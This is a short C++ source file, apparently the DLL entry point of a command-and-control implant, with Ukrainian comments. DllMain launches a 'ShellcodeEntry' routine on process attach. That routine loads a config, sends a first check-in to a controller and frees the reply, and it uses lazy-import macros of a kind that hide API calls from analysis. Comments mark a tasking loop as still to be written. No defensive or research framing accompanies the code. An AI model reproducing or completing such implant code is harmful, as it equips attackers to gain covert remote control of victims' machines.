#include "kort.h"
#include "Checkin.h"

extern "C" void __stdcall ShellcodeEntry() {
    if (!InitConfig()) return;

    // Перший check-in
    PParser resp = doCheckin();
    if (resp) {
        // Тут пізніше буде парсинг відповіді та цикл таскінгу
        LI_FN(LocalFree)(resp->original);
        freeParser(resp);
    }
    // TODO: AgentMain() з циклом
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        ShellcodeEntry();
    }
    return TRUE;
}